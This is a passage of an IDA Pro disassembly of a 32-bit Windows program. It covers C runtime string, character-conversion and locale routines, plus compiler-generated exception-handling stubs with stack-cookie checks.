loc_41E280:                             ; CODE XREF: .text:0041E2AF↓j
                lea     eax, [edx-1]
                pop     ebx
                retn
; ---------------------------------------------------------------------------
                align 10h
                xor     eax, eax
                mov     al, [esp+8]
                push    ebx
                mov     ebx, eax
                shl     eax, 8
                mov     edx, [esp+8]
                test    edx, 3
                jz      short loc_41E2BD

loc_41E2A8:                             ; CODE XREF: .text:0041E2BB↓j
                mov     cl, [edx]
                add     edx, 1
                cmp     cl, bl
                jz      short loc_41E280
                test    cl, cl
                jz      short loc_41E306
                test    edx, 3
                jnz     short loc_41E2A8

loc_41E2BD:                             ; CODE XREF: .text:0041E2A6↑j
                or      ebx, eax
                push    edi
                mov     eax, ebx
                shl     ebx, 10h
                push    esi
                or      ebx, eax

loc_41E2C8:                             ; CODE XREF: .text:0041E2F3↓j
                                        ; .text:0041E302↓j ...
                mov     ecx, [edx]
                mov     edi, 7EFEFEFFh
                mov     eax, ecx
                mov     esi, edi
                xor     ecx, ebx
                add     esi, eax
                add     edi, ecx
                xor     ecx, 0FFFFFFFFh
                xor     eax, 0FFFFFFFFh
                xor     ecx, edi
                xor     eax, esi
                add     edx, 4
                and     ecx, 81010100h
                jnz     short loc_41E30A
                and     eax, 81010100h
                jz      short loc_41E2C8
                and     eax, 1010100h
                jnz     short loc_41E304
                and     esi, 80000000h
                jnz     short loc_41E2C8

loc_41E304:                             ; CODE XREF: .text:0041E2FA↑j
                                        ; .text:0041E313↓j ...
                pop     esi
                pop     edi

loc_41E306:                             ; CODE XREF: .text:0041E2B3↑j
                pop     ebx
                xor     eax, eax
                retn
; ---------------------------------------------------------------------------

loc_41E30A:                             ; CODE XREF: .text:0041E2EC↑j
                mov     eax, [edx-4]
                cmp     al, bl
                jz      short loc_41E347
                test    al, al
                jz      short loc_41E304
                cmp     ah, bl
                jz      short loc_41E340
                test    ah, ah
                jz      short loc_41E304
                shr     eax, 10h
                cmp     al, bl
                jz      short loc_41E339
                test    al, al
                jz      short loc_41E304
                cmp     ah, bl
                jz      short loc_41E332
                test    ah, ah
                jz      short loc_41E304
                jmp     short loc_41E2C8
; ---------------------------------------------------------------------------

loc_41E332:                             ; CODE XREF: .text:0041E32A↑j
                pop     esi
                pop     edi
                lea     eax, [edx-1]
                pop     ebx
                retn
; ---------------------------------------------------------------------------

loc_41E339:                             ; CODE XREF: .text:0041E322↑j
                lea     eax, [edx-2]
                pop     esi
                pop     edi
                pop     ebx
                retn
; ---------------------------------------------------------------------------

loc_41E340:                             ; CODE XREF: .text:0041E317↑j
                lea     eax, [edx-3]
                pop     esi
                pop     edi
                pop     ebx
                retn
; ---------------------------------------------------------------------------

loc_41E347:                             ; CODE XREF: .text:0041E30F↑j
                lea     eax, [edx-4]
                pop     esi
                pop     edi
                pop     ebx
                retn
; [00000006 BYTES: COLLAPSED FUNCTION RtlUnwind. PRESS CTRL-NUMPAD+ TO EXPAND]

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41E354      proc near               ; CODE XREF: sub_41E398+20↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                cmp     [ebp+arg_4], 0
                jz      short loc_41E365
                mov     byte ptr [ecx], 2Dh
                inc     ecx
                neg     eax

loc_41E365:                             ; CODE XREF: sub_41E354+9↑j
                push    esi
                mov     esi, ecx

loc_41E368:                             ; CODE XREF: sub_41E354+2B↓j
                xor     edx, edx
                div     [ebp+arg_0]
                cmp     edx, 9
                jbe     short loc_41E377
                add     dl, 57h
                jmp     short loc_41E37A
; ---------------------------------------------------------------------------

loc_41E377:                             ; CODE XREF: sub_41E354+1C↑j
                add     dl, 30h

loc_41E37A:                             ; CODE XREF: sub_41E354+21↑j
                mov     [ecx], dl
                inc     ecx
                test    eax, eax
                ja      short loc_41E368
                mov     byte ptr [ecx], 0
                dec     ecx

loc_41E385:                             ; CODE XREF: sub_41E354+3D↓j
                mov     dl, [esi]
                mov     al, [ecx]
                mov     [ecx], dl
                dec     ecx
                mov     [esi], al
                inc     esi
                cmp     esi, ecx
                jb      short loc_41E385
                pop     esi
                pop     ebp
                retn    8
sub_41E354      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41E398      proc near               ; CODE XREF: sub_403B80+144↑p
                                        ; sub_4045C0+35↑p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                cmp     [ebp+arg_8], 0Ah
                mov     eax, [ebp+arg_0]
                jnz     short loc_41E3B0
                test    eax, eax
                jge     short loc_41E3B0
                push    1
                push    0Ah
                jmp     short loc_41E3B5
; ---------------------------------------------------------------------------

loc_41E3B0:                             ; CODE XREF: sub_41E398+C↑j
                                        ; sub_41E398+10↑j
                push    0
                push    [ebp+arg_8]

loc_41E3B5:                             ; CODE XREF: sub_41E398+16↑j
                mov     ecx, [ebp+arg_4]
                call    sub_41E354
                mov     eax, [ebp+arg_4]
                pop     ebp
                retn
sub_41E398      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41E3C2      proc near               ; CODE XREF: sub_41E4AC+9A↓p

var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = byte ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 10h
                push    ebx
                push    esi
                xor     esi, esi
                xor     eax, eax
                push    edi
                cmp     [ebp+arg_8], esi
                jz      loc_41E4A7
                mov     ebx, [ebp+arg_0]
                cmp     ebx, esi
                jnz     short loc_41E403

loc_41E3E1:                             ; CODE XREF: sub_41E3C2+46↓j
                call    sub_41090E
                push    esi
                push    esi
                push    esi
                push    esi
                push    esi
                mov     dword ptr [eax], 16h
                call    sub_40EC54
                add     esp, 14h
                mov     eax, 7FFFFFFFh
                jmp     loc_41E4A7
; ---------------------------------------------------------------------------

loc_41E403:                             ; CODE XREF: sub_41E3C2+1D↑j
                mov     edi, [ebp+arg_4]
                cmp     edi, esi
                jz      short loc_41E3E1
                push    [ebp+arg_C]
                lea     ecx, [ebp+var_10]
                call    sub_40E461
                mov     eax, [ebp+var_10]
                cmp     [eax+14h], esi
                jnz     short loc_41E45C

loc_41E41D:                             ; CODE XREF: sub_41E3C2+96↓j
                movzx   eax, word ptr [ebx]
                cmp     ax, 41h
                jb      short loc_41E42F
                cmp     ax, 5Ah
                ja      short loc_41E42F
                add     eax, 20h

loc_41E42F:                             ; CODE XREF: sub_41E3C2+62↑j
                                        ; sub_41E3C2+68↑j
                movzx   esi, ax
                movzx   eax, word ptr [edi]
                cmp     ax, 41h
                jb      short loc_41E444
                cmp     ax, 5Ah
                ja      short loc_41E444
                add     eax, 20h

loc_41E444:                             ; CODE XREF: sub_41E3C2+77↑j
                                        ; sub_41E3C2+7D↑j
                inc     ebx
                inc     ebx
                inc     edi
                inc     edi
                dec     [ebp+arg_8]
                movzx   eax, ax
                jz      short loc_41E492
                test    si, si
                jz      short loc_41E492
                cmp     si, ax
                jz      short loc_41E41D
                jmp     short loc_41E492
; ---------------------------------------------------------------------------

loc_41E45C:                             ; CODE XREF: sub_41E3C2+59↑j
                                        ; sub_41E3C2+CE↓j
                lea     eax, [ebp+var_10]
                push    eax
                movzx   eax, word ptr [ebx]
                push    eax
                call    sub_41E552
                movzx   esi, ax
                lea     eax, [ebp+var_10]
                push    eax
                movzx   eax, word ptr [edi]
                push    eax
                call    sub_41E552
                add     esp, 10h
                inc     ebx
                inc     ebx
                inc     edi
                inc     edi
                dec     [ebp+arg_8]
                movzx   eax, ax
                jz      short loc_41E492
                test    si, si
                jz      short loc_41E492
                cmp     si, ax
                jz      short loc_41E45C

loc_41E492:                             ; CODE XREF: sub_41E3C2+8C↑j
                                        ; sub_41E3C2+91↑j ...
                movzx   ecx, ax
                movzx   eax, si
                sub     eax, ecx
                cmp     [ebp+var_4], 0
                jz      short loc_41E4A7
                mov     ecx, [ebp+var_8]
                and     dword ptr [ecx+70h], 0FFFFFFFDh

loc_41E4A7:                             ; CODE XREF: sub_41E3C2+12↑j
                                        ; sub_41E3C2+3C↑j ...
                pop     edi
                pop     esi
                pop     ebx
                leave
                retn
sub_41E3C2      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41E4AC      proc near               ; CODE XREF: sub_40DD30+6E↑p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                xor     esi, esi
                push    edi
                cmp     dword_42AE20, esi
                jnz     short loc_41E53C
                xor     eax, eax
                cmp     [ebp+arg_8], esi
                jz      loc_41E54E
                mov     edi, [ebp+arg_0]
                cmp     edi, esi
                jnz     short loc_41E4EE

loc_41E4CF:                             ; CODE XREF: sub_41E4AC+47↓j
                call    sub_41090E
                push    esi
                push    esi
                push    esi
                push    esi
                push    esi
                mov     dword ptr [eax], 16h
                call    sub_40EC54
                add     esp, 14h
                mov     eax, 7FFFFFFFh
                jmp     short loc_41E54E
; ---------------------------------------------------------------------------

loc_41E4EE:                             ; CODE XREF: sub_41E4AC+21↑j
                mov     edx, [ebp+arg_4]
                cmp     edx, esi
                jz      short loc_41E4CF

loc_41E4F5:                             ; CODE XREF: sub_41E4AC+84↓j
                movzx   eax, word ptr [edi]
                cmp     ax, 41h
                jb      short loc_41E507
                cmp     ax, 5Ah
                ja      short loc_41E507
                add     eax, 20h

loc_41E507:                             ; CODE XREF: sub_41E4AC+50↑j
                                        ; sub_41E4AC+56↑j
                movzx   ecx, ax
                movzx   eax, word ptr [edx]
                cmp     ax, 41h
                jb      short loc_41E51C
                cmp     ax, 5Ah
                ja      short loc_41E51C
                add     eax, 20h

loc_41E51C:                             ; CODE XREF: sub_41E4AC+65↑j
                                        ; sub_41E4AC+6B↑j
                inc     edi
                inc     edi
                inc     edx
                inc     edx
                dec     [ebp+arg_8]
                movzx   eax, ax
                jz      short loc_41E532
                cmp     cx, si
                jz      short loc_41E532
                cmp     cx, ax
                jz      short loc_41E4F5

loc_41E532:                             ; CODE XREF: sub_41E4AC+7A↑j
                                        ; sub_41E4AC+7F↑j
                movzx   edx, ax
                movzx   eax, cx
                sub     eax, edx
                jmp     short loc_41E54E
; ---------------------------------------------------------------------------

loc_41E53C:                             ; CODE XREF: sub_41E4AC+F↑j
                push    esi
                push    [ebp+arg_8]
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                call    sub_41E3C2
                add     esp, 10h

loc_41E54E:                             ; CODE XREF: sub_41E4AC+16↑j
                                        ; sub_41E4AC+40↑j ...
                pop     edi
                pop     esi
                pop     ebp
                retn
sub_41E4AC      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41E552      proc near               ; CODE XREF: sub_41E3C2+A2↑p
                                        ; sub_41E3C2+B2↑p

var_14          = dword ptr -14h
var_C           = dword ptr -0Ch
var_8           = byte ptr -8
DestStr         = word ptr -4
SrcStr          = word ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, 0FFFFh
                mov     ecx, eax
                sub     esp, 14h
                cmp     [ebp+SrcStr], cx
                jz      locret_41E605
                push    ebx
                push    [ebp+arg_4]
                lea     ecx, [ebp+var_14]
                call    sub_40E461
                mov     ecx, [ebp+var_14]
                mov     edx, [ecx+14h]
                xor     ebx, ebx
                cmp     edx, ebx
                jnz     short loc_41E597
                mov     eax, dword ptr [ebp+SrcStr]
                lea     ecx, [eax-41h]
                cmp     cx, 19h
                ja      short loc_41E592
                add     eax, 20h

loc_41E592:                             ; CODE XREF: sub_41E552+3B↑j
                                        ; sub_41E552+7B↓j
                movzx   eax, ax
                jmp     short loc_41E5F8
; ---------------------------------------------------------------------------

loc_41E597:                             ; CODE XREF: sub_41E552+2F↑j
                push    esi
                mov     eax, 100h
                mov     esi, eax
                cmp     [ebp+SrcStr], si
                pop     esi
                jnb     short loc_41E5CF
                lea     eax, [ebp+var_14]
                push    eax
                push    1
                push    dword ptr [ebp+SrcStr]
                call    sub_41C9B0
                add     esp, 0Ch
                test    eax, eax
                movzx   eax, [ebp+SrcStr]
                jz      short loc_41E5F8
                mov     ecx, [ebp+var_14]
                mov     ecx, [ecx+0CCh]
                movzx   ax, byte ptr [ecx+eax]
                jmp     short loc_41E592
; ---------------------------------------------------------------------------

loc_41E5CF:                             ; CODE XREF: sub_41E552+52↑j
                push    dword ptr [ecx+4]
                lea     ecx, [ebp+DestStr]
                push    1               ; cchDest
                push    ecx             ; lpDestStr
                push    1               ; cchSrc
                lea     ecx, [ebp+SrcStr]
                push    ecx             ; lpSrcStr
                push    eax             ; dwMapFlags
                push    edx             ; Locale
                lea     eax, [ebp+var_14]
                push    eax             ; int
                call    sub_41E607
                add     esp, 20h
                test    eax, eax
                movzx   eax, [ebp+SrcStr]
                jz      short loc_41E5F8
                movzx   eax, [ebp+DestStr]

loc_41E5F8:                             ; CODE XREF: sub_41E552+43↑j
                                        ; sub_41E552+6B↑j ...
                cmp     [ebp+var_8], bl
                jz      short loc_41E604
                mov     ecx, [ebp+var_C]
                and     dword ptr [ecx+70h], 0FFFFFFFDh

loc_41E604:                             ; CODE XREF: sub_41E552+A9↑j
                pop     ebx

locret_41E605:                          ; CODE XREF: sub_41E552+13↑j
                leave
                retn
sub_41E552      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_41E607(int, LCID Locale, DWORD dwMapFlags, LPCWSTR lpSrcStr, int cchSrc, LPWSTR lpDestStr, int cchDest)
sub_41E607      proc near               ; CODE XREF: sub_41E552+92↑p

var_10          = byte ptr -10h
var_8           = dword ptr -8
var_4           = byte ptr -4
arg_0           = dword ptr  8
Locale          = dword ptr  0Ch
dwMapFlags      = dword ptr  10h
lpSrcStr        = dword ptr  14h
cchSrc          = dword ptr  18h
lpDestStr       = dword ptr  1Ch
cchDest         = dword ptr  20h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 10h
                push    [ebp+arg_0]
                lea     ecx, [ebp+var_10]
                call    sub_40E461
                mov     eax, [ebp+cchSrc]
                test    eax, eax
                jle     short loc_41E639
                mov     ecx, [ebp+lpSrcStr]
                mov     edx, eax

loc_41E626:                             ; CODE XREF: sub_41E607+2A↓j
                dec     edx
                cmp     word ptr [ecx], 0
                jz      short loc_41E636
                inc     ecx
                inc     ecx
                test    edx, edx
                jnz     short loc_41E626
                or      edx, 0FFFFFFFFh

loc_41E636:                             ; CODE XREF: sub_41E607+24↑j
                sub     eax, edx
                dec     eax

loc_41E639:                             ; CODE XREF: sub_41E607+18↑j
                push    [ebp+cchDest]   ; cchDest
                push    [ebp+lpDestStr] ; lpDestStr
                push    eax             ; cchSrc
                push    [ebp+lpSrcStr]  ; lpSrcStr
                push    [ebp+dwMapFlags] ; dwMapFlags
                push    [ebp+Locale]    ; Locale
                call    ds:LCMapStringW
                cmp     [ebp+var_4], 0
                jz      short locret_41E65C
                mov     ecx, [ebp+var_8]
                and     dword ptr [ecx+70h], 0FFFFFFFDh

locret_41E65C:                          ; CODE XREF: sub_41E607+4C↑j
                leave
                retn
sub_41E607      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41E660      proc near               ; DATA XREF: .rdata:stru_422BD8↓o
                lea     ecx, [ebp-28h]
                jmp     sub_4085D0
sub_41E660      endp

; ---------------------------------------------------------------------------
; START OF FUNCTION CHUNK FOR sub_40E26B
;   ADDITIONAL PARENT FUNCTION sub_40E2A3

loc_41E668:                             ; DATA XREF: sub_40E26B+2↑o
                                        ; sub_40E2A3+2↑o ...
                mov     edx, [esp-4+arg_4]
                lea     eax, [edx+0Ch]
                mov     ecx, [edx-54h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_422BE0
                jmp     ___CxxFrameHandler3
; END OF FUNCTION CHUNK FOR sub_40E26B
; ---------------------------------------------------------------------------
; START OF FUNCTION CHUNK FOR sub_417EA1

loc_41E683:                             ; DATA XREF: sub_417EA1+2↑o
                                        ; .rdata:00422B08↓o
                mov     edx, [esp-4+arg_4]
                lea     eax, [edx+0Ch]
                mov     ecx, [edx-14h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_4230A0
                jmp     ___CxxFrameHandler3
; END OF FUNCTION CHUNK FOR sub_417EA1
; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


SEH_40A7D0      proc near               ; DATA XREF: sub_40A7D0+5↑o
                                        ; .rdata:00422B0C↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx+0Ch]
                mov     ecx, [edx-2Ch]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423414
                jmp     ___CxxFrameHandler3
SEH_40A7D0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41E6C0      proc near               ; DATA XREF: .rdata:stru_423438↓o

; FUNCTION CHUNK AT 00408C00 SIZE 0000000A BYTES

                mov     eax, [ebp+4]
                jmp     loc_408C00
sub_41E6C0      endp


; =============== S U B R O U T I N E =======================================


SEH_4091F0      proc near               ; DATA XREF: sub_4091F0+2↑o
                                        ; .rdata:00422B10↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-4]
                mov     ecx, [edx-8]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423440
                jmp     ___CxxFrameHandler3
SEH_4091F0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41E6F0      proc near               ; DATA XREF: .rdata:stru_423464↓o
                mov     ecx, [ebp-10h]
                jmp     sub_40E716
sub_41E6F0      endp


; =============== S U B R O U T I N E =======================================


SEH_401240      proc near               ; DATA XREF: sub_401240+2↑o
                                        ; .rdata:00422B14↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-0Ch]
                mov     ecx, [edx-10h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_42346C
                jmp     ___CxxFrameHandler3
SEH_401240      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41E720      proc near               ; DATA XREF: .rdata:stru_423490↓o
                mov     ecx, [ebp-10h]
                jmp     sub_40E716
sub_41E720      endp


; =============== S U B R O U T I N E =======================================


SEH_4010D0      proc near               ; DATA XREF: sub_4010D0+2↑o
                                        ; .rdata:00422B18↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-8]
                mov     ecx, [edx-0Ch]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423498
                jmp     ___CxxFrameHandler3
SEH_4010D0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41E750      proc near               ; DATA XREF: .rdata:stru_4234BC↓o
                mov     ecx, [ebp+4]
                jmp     sub_4085D0
sub_41E750      endp


; =============== S U B R O U T I N E =======================================


SEH_40AEF0      proc near               ; DATA XREF: sub_408B70+2↑o
                                        ; sub_40AEF0+2↑o ...

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-8]
                mov     ecx, [edx-0Ch]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_4234C4
                jmp     ___CxxFrameHandler3
SEH_40AEF0      endp

; ---------------------------------------------------------------------------
                align 10h
; [00000005 BYTES: COLLAPSED FUNCTION j_nullsub_2. PRESS CTRL-NUMPAD+ TO EXPAND]

; =============== S U B R O U T I N E =======================================


SEH_40A730      proc near               ; DATA XREF: sub_40A730+5↑o
                                        ; .rdata:00422B20↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx+0Ch]
                mov     ecx, [edx-18h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423524
                jmp     ___CxxFrameHandler3
SEH_40A730      endp


; =============== S U B R O U T I N E =======================================


sub_41E7A0      proc near               ; DATA XREF: .rdata:stru_423548↓o
                lea     ecx, [ebp-48h]
                jmp     sub_4085D0
sub_41E7A0      endp


; =============== S U B R O U T I N E =======================================


sub_41E7A8      proc near               ; DATA XREF: .rdata:00423550↓o
                lea     ecx, [ebp-64h]
                jmp     sub_4085D0
sub_41E7A8      endp


; =============== S U B R O U T I N E =======================================


sub_41E7B0      proc near               ; DATA XREF: .rdata:00423558↓o
                lea     ecx, [ebp-2Ch]
                jmp     sub_4085D0
sub_41E7B0      endp


; =============== S U B R O U T I N E =======================================


SEH_404E40      proc near               ; DATA XREF: sub_404E40+2↑o
                                        ; .rdata:00422B24↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-6Ch]
                mov     ecx, [edx-70h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     eax, 10h
                mov     ecx, [edx-4]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423560
                jmp     ___CxxFrameHandler3
SEH_404E40      endp


; =============== S U B R O U T I N E =======================================


sub_41E7E0      proc near               ; DATA XREF: .rdata:stru_423584↓o
                lea     ecx, [ebp-128h]
                jmp     sub_4085D0
sub_41E7E0      endp


; =============== S U B R O U T I N E =======================================


SEH_4041F0      proc near               ; DATA XREF: sub_4041F0+2↑o
                                        ; .rdata:00422B28↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-128h]
                mov     ecx, [edx-12Ch]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     eax, 0Ch
                mov     ecx, [edx-4]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_42358C
                jmp     ___CxxFrameHandler3
SEH_4041F0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41E820      proc near               ; DATA XREF: .rdata:stru_4235B0↓o
                lea     ecx, [ebp-30h]
                jmp     sub_4085D0
sub_41E820      endp

; [00000005 BYTES: COLLAPSED FUNCTION j_nullsub_2_0. PRESS CTRL-NUMPAD+ TO EXPAND]

; =============== S U B R O U T I N E =======================================


SEH_40B6B0      proc near               ; DATA XREF: sub_40B6B0+5↑o
                                        ; .rdata:00422B2C↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx+0Ch]
                mov     ecx, [edx-4Ch]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     ecx, [edx-8]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_4235FC
                jmp     ___CxxFrameHandler3
SEH_40B6B0      endp

; ---------------------------------------------------------------------------
                align 10h
; [00000005 BYTES: COLLAPSED FUNCTION j_nullsub_2_1. PRESS CTRL-NUMPAD+ TO EXPAND]

; =============== S U B R O U T I N E =======================================


SEH_40B4E0      proc near               ; DATA XREF: sub_40B4E0+5↑o
                                        ; .rdata:00422B30↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx+0Ch]
                mov     ecx, [edx-18h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_42365C
                jmp     ___CxxFrameHandler3
SEH_40B4E0      endp

; [00000005 BYTES: COLLAPSED FUNCTION j_nullsub_2_2. PRESS CTRL-NUMPAD+ TO EXPAND]

; =============== S U B R O U T I N E =======================================


SEH_40B0E0      proc near               ; DATA XREF: sub_40B0E0+5↑o
                                        ; .rdata:00422B34↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx+0Ch]
                mov     ecx, [edx-18h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_4236BC
                jmp     ___CxxFrameHandler3
SEH_40B0E0      endp


; =============== S U B R O U T I N E =======================================


sub_41E8A0      proc near               ; DATA XREF: .rdata:stru_4236E0↓o
                lea     ecx, [ebp-50h]
                jmp     sub_4085D0
sub_41E8A0      endp


; =============== S U B R O U T I N E =======================================


SEH_40AA20      proc near               ; DATA XREF: sub_4092F0+2↑o
                                        ; sub_40AA20+2↑o ...

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-54h]
                mov     ecx, [edx-58h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_4236E8
                jmp     ___CxxFrameHandler3
SEH_40AA20      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41E8D0      proc near               ; DATA XREF: .rdata:stru_42370C↓o
                lea     ecx, [ebp-50h]
                jmp     sub_4085D0
sub_41E8D0      endp


; =============== S U B R O U T I N E =======================================


SEH_40A3B0      proc near               ; DATA XREF: sub_40A3B0+2↑o
                                        ; .rdata:00422B3C↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-44h]
                mov     ecx, [edx-48h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423714
                jmp     ___CxxFrameHandler3
SEH_40A3B0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41E900      proc near               ; DATA XREF: .rdata:stru_423738↓o
                lea     ecx, [ebp-54h]
                jmp     sub_4085D0
sub_41E900      endp


; =============== S U B R O U T I N E =======================================


SEH_40A940      proc near               ; DATA XREF: sub_409D40+8↑o
                                        ; sub_40A940+8↑o ...

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-4Ch]
                mov     ecx, [edx-50h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423740
                jmp     ___CxxFrameHandler3
SEH_40A940      endp

; ---------------------------------------------------------------------------
                align 10h
; [00000005 BYTES: COLLAPSED FUNCTION j_nullsub_2_3. PRESS CTRL-NUMPAD+ TO EXPAND]

; =============== S U B R O U T I N E =======================================


SEH_408F30      proc near               ; DATA XREF: sub_408F30+2↑o
                                        ; .rdata:00422B44↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-8]
                mov     ecx, [edx-0Ch]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_42376C
                jmp     ___CxxFrameHandler3
SEH_408F30      endp


; =============== S U B R O U T I N E =======================================


sub_41E950      proc near               ; DATA XREF: .rdata:stru_423790↓o

; FUNCTION CHUNK AT 00408C00 SIZE 0000000A BYTES

                mov     eax, [ebp+8]
                jmp     loc_408C00
sub_41E950      endp


; =============== S U B R O U T I N E =======================================


SEH_408740      proc near               ; DATA XREF: sub_408740+5↑o
                                        ; .rdata:00422B48↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx+0Ch]
                mov     ecx, [edx-20h]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_4237CC
                jmp     ___CxxFrameHandler3
SEH_408740      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_41E980      proc near               ; DATA XREF: .rdata:stru_4237F0↓o
                jmp     sub_408BF0
sub_41E980      endp


; =============== S U B R O U T I N E =======================================


SEH_408630      proc near               ; DATA XREF: sub_408630+2↑o
                                        ; .rdata:00422B4C↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx]
                mov     ecx, [edx-4]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_4237F8
                jmp     ___CxxFrameHandler3
SEH_408630      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41E9A0      proc near               ; DATA XREF: .rdata:stru_42381C↓o

; FUNCTION CHUNK AT 00408C00 SIZE 0000000A BYTES

                mov     eax, [ebp+4]
                jmp     loc_408C00
sub_41E9A0      endp


; =============== S U B R O U T I N E =======================================


SEH_4084B0      proc near               ; DATA XREF: sub_4084B0+2↑o
                                        ; .rdata:00422B50↓o

arg_4           = dword ptr  8

                mov     edx, [esp+arg_4]
                lea     eax, [edx-8]
                mov     ecx, [edx-0Ch]
                xor     ecx, eax
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     eax, offset stru_423824
                jmp     ___CxxFrameHandler3
SEH_4084B0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_41E9D0      proc near               ; DATA XREF: .rdata:stru_423848↓o
                lea     eax, [ebp-1224h]
                push    eax
                call    sub_4084B0
                retn
sub_41E9D0      endp


; =============== S U B R O U T I N E =======================================


sub_41E9DD      proc near               ; DATA XREF: .rdata:00423850↓o

; FUNCTION CHUNK AT 00408C00 SIZE 0000000A BYTES

                lea     eax, [ebp-1224h]
                jmp     loc_408C00
sub_41E9DD      endp


; =============== S U B R O U T I N E =======================================


sub_41E9E8      proc near               ; DATA XREF: .rdata:00423858↓o
                lea     ecx, [ebp-1150h]
                jmp     sub_4085D0
sub_41E9E8      endp


; =============== S U B R O U T I N E =======================================


